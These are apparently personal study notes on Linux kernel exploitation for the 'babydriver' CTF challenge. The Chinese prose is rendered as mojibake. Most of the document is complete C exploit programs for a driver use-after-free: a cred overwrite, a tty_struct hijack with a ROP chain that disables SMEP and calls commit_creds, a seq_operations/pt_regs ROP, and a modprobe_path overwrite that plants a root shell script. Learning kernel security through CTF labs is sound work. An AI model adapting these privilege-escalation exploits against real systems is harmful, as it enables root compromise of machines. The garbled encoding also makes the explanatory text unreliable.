babyreleaseåœ¨é‡Šæ”¾åå¹¶æ²¡æœ‰ç½®ç©ºï¼Œæ‰€ä»¥è¿˜èƒ½æ‰§è¡Œwriteï¼Œreadç­‰æ“ä½œï¼ˆåªå¯¹babydev_struct.device_bufè¿›è¡Œæ ¡éªŒï¼‰

```c
int babyrelease(struct inode *inode, struct file *filp)
{
	kfree(babydev_struct.device_buf);
	printk("device release\n");
	return 0;
}
```

å…³äºé¢˜ç›®å¯åŠ¨çš„éƒ¨åˆ†
```shell
./qemu-system-x86_64 \
  -initrd rootfs.cpio \ # æŒ‡å®šæ ¹æ–‡ä»¶ç³»ç»Ÿ
  -kernel bzImage \ # æŒ‡å®šå¯åŠ¨å†…æ ¸é•œåƒ
  -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \ 
  # ttys0æ˜¯linuxä¸Šçš„ç¬¬ä¸€ä¸ªä¸²å£ï¼Œåœ¨qemuä¸­ï¼Œå®ƒä¼šæ˜ å°„åˆ°å½“å‰ç»ˆç«¯ï¼Œç›¸å¯¹åº”çš„tty0æŒ‡ä»£çš„å°±æ˜¯å›¾å½¢ç•Œé¢
  # initrdå³ram diskï¼Œå†…å­˜é‡Œç”¨äºå¯åŠ¨çš„è™šæ‹Ÿç£ç›˜ï¼Œåˆå§‹ RAM æ–‡ä»¶ç³»ç»Ÿã€‚è¿™é‡ŒæŠŠ/dev/ram è®¾å¤‡å½“ä½œæ ¹ç›®å½• / æŒ‚è½½
  # ä¸€æ—¦å†…æ ¸å‡ºç° Oops é”™è¯¯å°±è§¦å‘ panicï¼ˆæ–¹ä¾¿è°ƒè¯•ï¼‰
  # panic å 1 ç§’è‡ªåŠ¨é‡å¯ï¼ˆé˜²æ­¢å¡æ­»ï¼‰
  -monitor /dev/null \
  -m 64M \
  --nographic \
  -smp cores=1,threads=1 \ # smpå³å¯¹ç§°å¤šæ ¸å¤„ç†ï¼Œæ¯é¢—æ ¸å¿ƒéƒ½æ˜¯å¯¹ç­‰çš„æ— ä¸»æ¬¡ä¹‹åˆ†ï¼Œè¿™é‡Œå°±æ˜¯å¯ç”¨è¿™æ ·çš„æœºåˆ¶ï¼Œè¿™é‡Œåªç”¨å•æ ¸å•çº¿ç¨‹
  -cpu kvm64,+smep \ # ä½¿ç”¨æ”¯æŒ SMEP çš„ CPU æ¨¡å‹ æ¨¡æ‹Ÿå¼€å¯ SMEP æƒ…å†µ
  -L ./pc-bios/ # ä½¿ç”¨æœ¬åœ°çš„ BIOS æ–‡ä»¶å¤¹

```



å­¦ä¹ æ–‡ç« ï¼š
https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D

| ç»“æ„ä½“/èƒ½åŠ› | æ§åˆ¶æµåŠ«æŒ | æ³„éœ²å † | æ³„éœ²æ ˆ | æ³„éœ²å†…æ ¸åœ°å€ | ç»“æ„ä½“å¤§å° |
| ---- | ---- | ---- | ---- | ---- | ---- |
| cred | x | âˆš | x | x | 0xa8 (kmalloc-192) |
| tty_struct | âˆš | âˆš | x | âˆš | 0x2e0 (kmalloc-1024) |
| seq_operations | âˆš | x | x | âˆš | 0x20 (kmalloc-32) |
| subprocess_info | âˆš | âˆš | x | âˆš | 0x60 (kmalloc-128) |
| pipe_buffer | âˆš | x | x | âˆš | 0x280 (kmalloc-1024) |
| shm_file_data | x | âˆš | x | âˆš | 0x20 (kmalloc-32) |
| msg_msg | x | âˆš | x | x | 0x31~0x1000 (>= kmalloc-64) |
| timerfd_ctx | x | âˆš | x | âˆš | 0xf0 (kmalloc-256) |
pt_regs è§£å†³ -ã€‹smeb ä¸èƒ½æ‰§è¡Œç”¨æˆ·æ€çš„ROPï¼Œæ‰€ä»¥æ”¾åˆ°å†…æ ¸æ ˆä¸Šï¼ˆå¤ªçŸ­çš„è¯ï¼Œå¯ä»¥åœ¨å†…æ ¸æ ˆä¸Šmov rsp,raxå®ç°æ ˆè¿ç§»åˆ°ç”¨æˆ·æ ˆä¸Šç„¶åä¿®æ”¹æ‰CR4å˜é‡ï¼‰

#### cred
è¿™é‡Œçš„å‡ ä¸ªå‡½æ•°éƒ½æ˜¯é’ˆå¯¹äºbabydev_structè¿™ä¸ªå…¨å±€å˜é‡æ“ä½œï¼Œè€Œfdä»…ä»…ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œä½†æ˜¯ç¡®æ˜¯write/ioctl/readç­‰åŠŸèƒ½çš„å¿…è¦å‚æ•°
è¦åˆ©ç”¨UAFï¼Œå…ˆå¼€2ä¸ªå¥æŸ„ï¼Œåˆ©ç”¨ioctlä¿®æ”¹å…¨å±€chunkå¤§å°ä¸º0xa8å³credçš„å¤§å°ï¼Œç„¶åé‡Šæ”¾chunkï¼Œç„¶åforkä¸€ä¸ªå­è¿›ç¨‹ï¼Œå°±ä¼šç”³è¯·æ‰è¿™ä¸ª0xa8ï¼Œç„¶åç”¨2å·å¥æŸ„æ‰§è¡Œwriteå¾€è¿™ä¸ªå…¨å±€chunké‡Œå†™0å³å¯

å€¼å¾—æ³¨æ„çš„ç‚¹
è°ƒç”¨closeåï¼Œåœ¨å†…æ ¸ç©ºé—´ï¼Œä¼šè¿›å…¥ sys_close() â†’__close_fd() â†’ filp_close()ï¼š
```c
int filp_close(struct file *filp, fl_owner_t id)
{
    if (filp->f_op->release)
        filp->f_op->release(inode, filp);  // â‘  è°ƒç”¨é©±åŠ¨ä¸­å®šä¹‰çš„ release
    fput(filp);                            // â‘¡ å‡å°‘ file å¼•ç”¨è®¡æ•°ï¼Œå¦‚æœä¸º0å°±é‡Šæ”¾
}
```

fputä¼šå…³é—­å¥æŸ„

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>

int main(){
	int fd1 = open("/dev/babydev",2);
	int fd2 = open("/dev/babydev",2);			

	ioctl(fd1,0x10001,0xa8);					
	close(fd1);												

	pid_t fpid; 
	fpid=fork(); 							
	if (fpid < 0) {
		printf("error in fork!\n"); 
		exit(0);
	}else if (fpid == 0) {
		printf("child pid is : %d\n",getpid());
        char zeros[30] = {0};
        write(fd2,zeros,28);				
	    if(getuid() == 0){
		    system("/bin/sh");					
		    exit(0);
	    }
	}else {
		wait(NULL);
		printf("parent pid is: %d\n",getpid());
	}
	printf("%d: going to close fd2\n",getpid());
	close(fd2);					

	return 0;
}
```


#### tty_struct
æ”»å‡»é“¾æ¡å…¨è¿‡ç¨‹

| é˜¶æ®µ | è¯´æ˜                                                  |
| -- | --------------------------------------------------- |
| 1  | `open()` + `ioctl()` â†’ åˆ†é…å¹¶é‡Šæ”¾ä¸€å—å †å†…å­˜ï¼ˆUAFï¼‰              |
| 2  | `open("/dev/ptmx")` å †å–· â†’ åˆ†é…åˆ° tty\_struct åˆ° UAF åŒº    |
| 3  | `read(fd2)` â†’ è¯»å–å †ä¸Š tty\_struct                      |
| 4  | ä¿®æ”¹å…¶ `.ops` æŒ‡é’ˆä¸ºä¼ªé€ çš„ `tty_operations`                  |
| 5  | å†æ¬¡ `write(fd2)` å†™å›                                  |
| 6  | `write(fd_tty,...)` è§¦å‘å‡½æ•°æŒ‡é’ˆè·³è½¬                        |
| 7  | gadget `mov rsp, rax` å®ç°æ ˆè¿ç§»                         |
| 8  | ç”¨æˆ·ç©ºé—´ ROP é“¾è°ƒç”¨ `commit_creds(prepare_kernel_cred(0))` |
| 9  | `iretq` è¿”å›ç”¨æˆ·æ€ â†’ `system("/bin/sh")`                 |

åœ¨å¼€å§‹åç»­å¾—å†…å®¹ä¹‹å‰ï¼Œéœ€è¦å›é¡¾ä¸€äº›çŸ¥è¯†ç‚¹
bzImage æ˜¯å‹ç¼©è¿‡çš„ Linux å†…æ ¸å¯åŠ¨é•œåƒï¼Œç”¨æ¥å¯åŠ¨è™šæ‹Ÿæœºæˆ–çœŸå®æœºå™¨çš„å†…æ ¸é•œåƒã€‚vmlinuxè¢«å‹ç¼©æˆ gzip æ ¼å¼åµŒå…¥åœ¨ bzImage é‡Œ

| æ–‡ä»¶        | ä½œç”¨            | æ˜¯å¦å¯è°ƒè¯•               |
| --------- | ------------- | ------------------- |
| `bzImage` | å¯å¯åŠ¨çš„å‹ç¼©å†…æ ¸      | âŒ æ— ç¬¦å·è¡¨ï¼Œ**ä¸èƒ½ç”¨äº GDB** |
| `vmlinux` | ç¼–è¯‘åçš„å®Œæ•´ ELF å†…æ ¸ | âœ… åŒ…å«ç¬¦å·è¡¨ï¼Œå¯è°ƒè¯•         |
è¦è¿›è¡Œåˆ†ææˆ‘ä»¬å¾—å…ˆæ‹¿åˆ°vmlinuxï¼Œè¿™ä¸ªæœ€å¥½æ˜¯æå‰å‡†å¤‡ï¼Œè¿™é‡Œç”¨åˆ°çš„linuxå†…æ ¸ç‰ˆæœ¬ä¸º4.4.72
ä¹Ÿå¯ä»¥ç”¨linuxè‡ªå¸¦çš„å·¥å…·æå–ï¼Œè¿™æ ·æå–çš„ç¼ºå°‘è°ƒè¯•ä¿¡æ¯ï¼Œä½†æ˜¯å¯ä»¥ç”¨æ¥æ‰¾gadgetï¼Œå¯¼å‡ºåç”¨vscodeæœç´¢å³å¯

```
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux
ROPgadget --binary ./vmlinux > ropgadget.txt
# åªè¦æ²¡å¼€kalsrï¼Œå†…æ ¸åœ°å€å›ºå®šä¸å˜ï¼Œkoçš„ä½ç½®ç†è®ºä¸Šæ˜¯éšæœºåˆ†é…çš„ï¼Œä½†æ˜¯åœ¨åŠå…¶å¹²å‡€çš„å†…å­˜å¸ƒå±€ä¸‹
```

åœ¨åšçš„æ—¶å€™æˆ‘ä»¬é€šå¸¸ä¼šä»¥rootæ¨¡å¼æ¥è¿›è¡Œè°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦é…ç½®ä¸€ä¸ªè¿™é“é¢˜çš„è°ƒè¯•ç¯å¢ƒ
+ ä¸€ä¸ªæ˜¯boot.shä¸Šæ˜¯å¦å­˜åœ¨åœ°å€éšæœºåŒ–ï¼Œé»˜è®¤ä¸ºå¼€å¯çŠ¶æ€ï¼Œåº”è¯¥å…³é—­ nokaslr
+ å¦ä¸€ä¸ªå°±æ˜¯ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿé‡Œçš„initæ–‡ä»¶ï¼Œå¾€å¾€æ¶‰åŠäº†æƒé™çš„è®¾ç½®ï¼Œåº”è¯¥åˆ‡æ¢åˆ°root

å…³äºinit

```shell
#!/bin/sh
echo "{==DBG==} INIT SCRIPT"
# 
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t debugfs none /sys/kernel/debug # ç”¨äºè®¿é—® debug æ¥å£ï¼ˆæ¯”å¦‚ ftraceï¼‰
mount -t tmpfs none /tmp # æŒ‚è½½å†…å­˜ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿï¼Œ/tmp å¿…é¡»å¯å†™ï¼ŒæŸäº›ç¨‹åºéœ€è¦

mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts

insmod /babydriver.ko           # load ko
mdev -s                         # mdev -s æ‰«æè®¾å¤‡å¹¶ç”Ÿæˆ /dev ä¸‹çš„è®¾å¤‡èŠ‚ç‚¹ï¼Œä¾‹å¦‚ /dev/babydev å°±æ˜¯è¿™æ ·ç”Ÿæˆçš„
chmod 777 /dev/babydev
chmod 666 /dev/ptmx

echo -e "{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
# setsid /bin/cttyhack setuidgid 1000 /bin/sh             #normal user å¯åŠ¨ä¸€ä¸ªæ–°çš„sessionï¼Œ	è‡ªåŠ¨ç»‘å®š /dev/console ç»™å½“å‰è¿›ç¨‹
exec /bin/sh                                           #root

umount /proc    # è¿™é‡Œå¼€å§‹å°±æ˜¯é€€å‡º/bin/shåçš„æµç¨‹ï¼Œå–æ¶ˆæŒ‚è½½ï¼Œè¿›å…¥å¼ºåˆ¶å…³æœº
umount /sys/kernel/debug
umount /sys
umount /tmp
poweroff -d 0  -f # poweroff -d 120 -f &æœ‰æ—¶å€™ä¼šæœ‰è¿™ç§å®šæ—¶å…³æœºï¼Œæ³¨æ„æ³¨é‡Šæ‰
```

æœ‰äº†rootæƒé™å°±å¯ä»¥æŸ¥çœ‹ä¸€äº›å†…æ ¸å‡½æ•°çš„åœ°å€ï¼ŒåŒæ ·`/proc/kallsyms`ä¹Ÿç”¨æ¥çœ‹å†…æ ¸åŸºåœ°å€

```
grep prepare_kernel_cred  /proc/kallsyms
grep commit_creds  /proc/kallsyms
grep ko_test_init  /proc/kallsyms
grep babyrelease /proc/kallsyms


lsmod ä¹Ÿèƒ½çœ‹åˆ°æ¨¡å—åŸºå€
å†…æ ¸åŸºåœ°å€ç”¨ï¼š
cat /proc/kallsyms | grep startup_64
```

åŒæ—¶æ”¯æŒåœ¨è°ƒè¯•çš„æ—¶å€™æ·»åŠ éƒ¨åˆ†ç¬¦å·ä¿¡æ¯

| å‚æ•°   | å«ä¹‰                                                              |
| ---- | --------------------------------------------------------------- |
| `-s` | ç­‰ä»·äº `-gdb tcp::1234`ï¼Œåœ¨ç«¯å£ `1234` ä¸Šå¯åŠ¨ GDB è°ƒè¯•æœåŠ¡                    |
| `-S` | å¯åŠ¨å**æŒ‚èµ· CPUï¼ˆæš‚åœè¿è¡Œï¼‰**ï¼Œç­‰å¾… GDB é™„åŠ ï¼Œ**ç›´åˆ°ä½ åœ¨ GDB ä¸­è¾“å…¥ `continue` æ‰å¯åŠ¨å†…æ ¸** |


```shell
ä¸€ä¸ªç»ˆç«¯
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -monitor /dev/null -m 128M --nographic -S -s

å¦ä¸€ä¸ªç»ˆç«¯
pwndbg> file ./vmlinux
pwndbg> target remote :1234
pwndbg> add-symbol-file ./xxx.ko 0xffffffffa0000000 # åŸºåœ°å€
pwndbg> b start_kernel
pwndbg> c
```


å›é¡¾ä¸€ä¸‹æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ï¼Œåˆ°ç¬¬ä¸ƒæ­¥è§¦å‘åˆ°gadget(mov rsp, rax)å¼€å§‹æ ˆè¿ç§»ï¼Œæ­¤æ—¶raxé‡Œå­˜æ”¾çš„æ—¶tty_opsçš„åœ°å€ï¼Œä½†æ˜¯æ ˆè¿ç§»åˆ°tty_opså¼€å¤´ç”±äºæˆ‘ä»¬åœ¨opså†…æœ‰å‡½æ•°å¸ƒå±€(+0x38å¤„write)ï¼Œæ‰€ä»¥è·ç¦»ä¸å¤Ÿè¿˜è¦å†æ¬¡è¿ç§»ï¼Œç”¨pop_rax+ROPé“¾_addr+mov_rsp_rax

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250610123114.png)

ttyç»“æ„ä½“0x2e0å­—èŠ‚å¤§å°ï¼Œå¦‚ä¸‹+0x18å¤„ä¸ºtty_ops

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20250610123131.png)

```c
// test.c
// gcc test.c -static -masm=intel  -o test
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<errno.h>

size_t pkc_addr = 0xffffffff81070260;
size_t cc_addr = 0xffffffff8106fed0;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
    save_status();

    size_t mov_rsp_rax = 0xffffffff818855cf;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
    size_t pop_rax = 0xffffffff8101c216;        // pop rax; ret; 
    
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret 
    rop_chain[index++] = 0xffffffff81884177;        // iretq; 
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;

    size_t tty_operations_fake[30];
    for(int j=0;j<30;j++){
        tty_operations_fake[j]=mov_rsp_rax;   
    }

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x2e0);
    close(fd1);

    int fd_tty = open("dev/ptmx",O_RDWR | O_NOCTTY);
    if(fd_tty < 0){
        printf("[+] cannot open /dev/ptmx\n");
        printf("[+] ptmx errorno: %d\n",errno);
        goto exit;
    }

    size_t tty_struct_leak[4];
    read(fd2,tty_struct_leak,32);
    
    tty_operations_fake[0] = pop_rax;
    tty_operations_fake[1] = (size_t)rop_chain;
    tty_operations_fake[2] = mov_rsp_rax;

    tty_struct_leak[3] = (size_t)tty_operations_fake;
    write(fd2,tty_struct_leak,32);

    size_t a[4] = {0,0,0,0};
    write(fd_tty,a,32);
    // ioctl(fd_tty,0x100,32);
exit:
    close(fd2);
	return 0;
}
```

#### seq_operations(seq_operations + pt_regs)

åœ¨ç”¨æˆ·æ€æ‰§è¡Œopen("/proc/self/stat",0);åï¼Œå†…æ ¸ä¸­çš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º(è‡ªä¸‹å¾€ä¸Š)
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116173829.png)

#2 é‡Œ å†…æ ¸ä¸­ä¼šè°ƒç”¨single_open()å‡½æ•°ï¼Œç„¶åä¸ºstruct seq_operations ç»“æ„ä½“ç”³è¯·ä¸€æ®µå†…å­˜ç©ºé—´ï¼ˆ0x20å­—èŠ‚å¤§å°ï¼‰,ç„¶åç”¨æˆ·æ€è·å¾—ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦fd

åœ¨ç”¨æˆ·æ€æ‰§è¡Œread(fd,buf,size)æ—¶ï¼Œä¼šè°ƒç”¨#0 single_startï¼Œè¿™ä¸ªæŒ‡é’ˆæ¥è‡ªstruct seq_operations->start
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240116174040.png)


å› æ­¤ï¼Œå¦‚æœèƒ½åœ¨openåæ”¹æ‰ç»“æ„ä½“é‡Œçš„startæŒ‡é’ˆ(add_rsp_xxx)ï¼Œå°±èƒ½åœ¨read(pt_regs->syscallread+rop_chain)å‰å®ŒæˆåŠ«æŒ


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<errno.h>

int fd_stat;
__uint64_t temp_buf[4];
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b ï¼ˆretï¼‰
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t fake_stack[20];
__uint64_t fake_stack_addr = &fake_stack;

size_t pkc_addr = 0xffffffff81070260;
size_t cc_addr = 0xffffffff8106fed0;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}



__uint64_t gadget1 = 0xffffffff815f5951;// add rsp,0x108; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret

int main(){
    save_status();
    printf("fake_stack_addr: 0x%llx\n",fake_stack_addr);

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);

    fd_stat = open("/proc/self/stat",0);
    write(fd2,&gadget1,8);

    fake_stack[0] = pop_rax_ret;
    fake_stack[1] = 0x6f0;
    fake_stack[2] = mov_cr4_rax_ret;
    fake_stack[3] = 0xffff;         // rbp, padding
    fake_stack[4] = get_root;
    fake_stack[5] = swapgs_ret;
    fake_stack[6] = iretq;
    fake_stack[7] = get_shell;
    fake_stack[8] = user_cs;
    fake_stack[9] = user_rflags;
    fake_stack[10] = user_sp;
    fake_stack[11] =  user_ss;

    __asm__(
    "mov r15, 0x15151515;"
    "mov r14, 0x14141414;"      // 4
    "mov r13, mov_rsp_rax_ret;"      // 3
    "mov r12, fake_stack_addr;"      // 2
    "mov r11, 0x11111111;"
    "mov r10, 0x10101010;"      // r10
    "mov rbp, 0xbbbbbbbb;"      // 5
    "mov rbx, pop_rax_ret;"      // 1
    "mov r9, 0x99999999;"       // r9
    "mov r8, 0x88888888;"       //r8
    "mov rcx, 0xcccccccc;"
    "xor rax, rax;"
    "mov rdx, 0x20;"
    "mov rsi, temp_buf;"
    "mov rdi, fd_stat;"
    "syscall"
    );
    close(fd_stat);
	close(fd2);
    return 0;
}
```

pt_regsæ¨¡æ¿

```c
    //int64_t seq_read_buf[4];
    __asm__(
        "mov r15, 0x15151515;"      // 
        "mov r14, 0x14141414;"      // 1
        "mov r13, 0x13131313;"      // 2
        "mov r12, 0x12121212;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, 0x10101010;"      // 7
        "mov rbp, 0xaaaaaaaa;"      // 4
        "mov rbx, 0xbbbbbbbb;"      // 5
        "mov r9, 0x99999999;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
```

+modprobe_path(çœå»æ ˆè¿ç§»)

```c

int g_fd;
int seq_fd;
int64_t seq_read_buf[4];

int prepare(){
    system("echo '#!/bin/sh\nrm /bin/umount\necho -e \"#!/bin/sh\\n/bin/sh\" > /bin/umount\nchmod 777 /bin/umount' > /tmp/x");
    system("chmod +x /tmp/x");//0x782f706d742f
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    if(fork()) {
        sleep(3);
        system("/tmp/dummy 2>/dev/null");
        system("ls -l /flag");
        system("cat /flag");
        exit(1);
    }
}

int64_t add_rsp_170_ret = 0xffffffff819d9f4c;
int64_t pop_rax_ret = 0xffffffff81000ddb;
int64_t pop_rdi_ret = 0xffffffff8106ab4d;
int64_t mov_ptr_rdi_rax_ret = 0xffffffff81074e3c; //: mov qword ptr [rdi], rax ; xor eax, eax ; jmp 0xffffffff82003240;
int64_t modprobe_path_addr = 0xFFFFFFFF828510A0;
int64_t do_task_dead_func = 0xFFFFFFFF810A3190;
int64_t pop_rbp_ret = 0xffffffff810679ef;

int hijack(){
    int OBJ_SIZE = 0x20;
    char * tmp_buf = malloc(OBJ_SIZE);
    memset(tmp_buf,'a',OBJ_SIZE);
    rwctf_ioctl_kmalloc(0,OBJ_SIZE,tmp_buf);
    rwctf_ioctl_kfree(0);

    seq_fd = open("/proc/self/stat",0);
    rwctf_ioctl_kfree(0);
    char fake_seq_operations[OBJ_SIZE];
    memset(fake_seq_operations,'0',OBJ_SIZE);
    *(unsigned long long *)&fake_seq_operations[0x0] = add_rsp_170_ret;
    *(unsigned long long *)&fake_seq_operations[0x8] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x10] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x18] = 0x0;

    rwctf_ioctl_kmalloc(0,OBJ_SIZE,fake_seq_operations);
    //int64_t seq_read_buf[4];
    __asm__(
        "mov r15, 0x15151515;"      // 
        "mov r14, pop_rax_ret;"      // 1
        "mov r13, 0x782f706d742f;"      // 2
        "mov r12, pop_rdi_ret;"      // 3
        "mov r11, 0x11111111;"      // 
        "mov r10, mov_ptr_rdi_rax_ret;"      // 7
        "mov rbp, modprobe_path_addr;"      // 4
        "mov rbx, pop_rbp_ret;"      // 5
        "mov r9, do_task_dead_func;"       // 8
        "mov r8, 0x88888888;"       // 9
        "mov rcx, 0xcccccccc;"
        "xor rax, rax;"             // 6
        "mov rdx, 0x20;"            //
        "mov rsi, seq_read_buf;"
        "mov rdi, seq_fd;"          // read(seq_fd,seq_read_buf,0x20)
        "syscall"
    );
}


int main(){
    g_fd  = open("/dev/rwctf",2);
    prepare();
    hijack();
}
```

#### modprobe_path

```shell
# æ™®é€šæƒé™å³å¯ä¿®æ”¹è¯¥å€¼,å¹¶ä¸”è¯¥ç¨‹åºå…·æœ‰rootæƒé™
cat /proc/sys/kernel/modprobe
-> /sbin/modprobe
```

å½“å†…æ ¸è¿è¡Œä¸€ä¸ªé”™è¯¯æ ¼å¼çš„æ–‡ä»¶ï¼ˆæˆ–æœªçŸ¥æ–‡ä»¶ç±»å‹çš„æ–‡ä»¶ï¼‰çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªç¨‹åº
```
ï¼ˆ1ï¼‰do_execve()
ï¼ˆ2ï¼‰do_execveat_common()
ï¼ˆ3ï¼‰bprm_execve()
ï¼ˆ4ï¼‰exec_binprm()
ï¼ˆ5ï¼‰search_binary_handler()
ï¼ˆ6ï¼‰request_module()
ï¼ˆ7ï¼‰call_usermodehelper() -> /sbin/modprobe
```

2017å¹´ä»linux4.11å¼€å§‹å°±æå‡ºäº†CONFIG_STATIC_USERMODEHELPERæ¥é˜²æ­¢modprobe_pathè¢«æ”¹
æ‰€ä»¥è¦ä¿è¯CONFIG_STATIC_USERMODEHELPERæœªå¯ç”¨

```shell
# å…¶å®æ²¡æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å¼€å¯
grep CONFIG_STATIC_USERMODEHELPER /boot/config-$(uname -r)
```


#### user_key_payload(æ³„éœ²åœ°å€)

add_keyå‡½æ•°åŸå‹

```c
#include <sys/types.h>
#include <keyutils.h>

key_serial_t add_key(const char *type, const char *description,const void *payload, size_t plen,key_serial_t keyring);
```

å…¶ä¸­ï¼š
type ç”¨äºæŒ‡å®šå¯†é’¥çš„ç±»å‹ã€‚è¿™ä¸ªå‚æ•°å†³å®šäº†å¯†é’¥çš„ç”¨é€”å’Œè¡Œä¸ºã€‚å¸¸è§çš„ç±»å‹åŒ…æ‹¬ "user" å’Œ "keyring"
descriptionæ˜¯å¯†é’¥çš„æè¿°ã€‚è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†å¯†é’¥ã€‚ç³»ç»Ÿä¼šæ ¹æ®è¿™ä¸ªæè¿°æ¥åŒºåˆ†ä¸åŒçš„å¯†é’¥ã€‚
payload æ˜¯æŒ‡å‘åŒ…å«å¯†é’¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚è¿™ä¸ªç¼“å†²åŒºåŒ…å«äº†å¯†é’¥çš„å®é™…å†…å®¹ã€‚
plen æ˜¯ç¼“å†²åŒºçš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½
keyring æ˜¯å¯†é’¥ç¯çš„åºåˆ—å·ï¼ŒæŒ‡å®šè¯¥å¯†é’¥åº”è¯¥è¢«æ·»åŠ åˆ°å“ªä¸ªå¯†é’¥ç¯ä¸­ã€‚
å¯†é’¥ç¯æœ¬èº«ä¹Ÿæ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯†é’¥ï¼Œå¯ä»¥åŒ…å«å…¶ä»–å¯†é’¥ã€‚

æ‰§è¡Œæµç¨‹ï¼š
* é¦–å…ˆä¼šæ£€æµ‹å‚æ•°æ˜¯å¦æ­£ç¡®
* åˆ†é…å¯¹è±¡obj1ï¼Œç”¨æ¥å­˜å‚¨å¯†é’¥æ•°æ®ã€‚åŒ…å«å¯†é’¥çš„typeã€descriptionã€æœ‰æ•ˆæœŸã€è®¿é—®æƒé™ä»¥åŠpayloadæŒ‡é’ˆ
* å°†payloadæ‹·è´åˆ°obj2(plen)ä¸­
* ç„¶åå°†å¯¹åº”çš„å†…å®¹å†æ¬¡æ‹·è´åˆ°obj3å’Œobj4(plen+0x18)ä¸­
* é‡Šæ”¾obj1å’Œobj2
* æ“ä½œå®Œæˆåï¼Œç³»ç»Ÿè¿”å›æ–°åˆ›å»ºçš„å¯†é’¥çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆå¯†é’¥ IDï¼‰ã€‚è¿™ä¸ª ID å¯ç”¨äºåç»­æ“ä½œï¼Œå¦‚æŸ¥è¯¢ã€ä¿®æ”¹æˆ–åˆ é™¤å¯†é’¥ã€‚

æ³¨æ„çš„ç‚¹ï¼š
æ‹·è´obj1å’Œobj2ï¼š
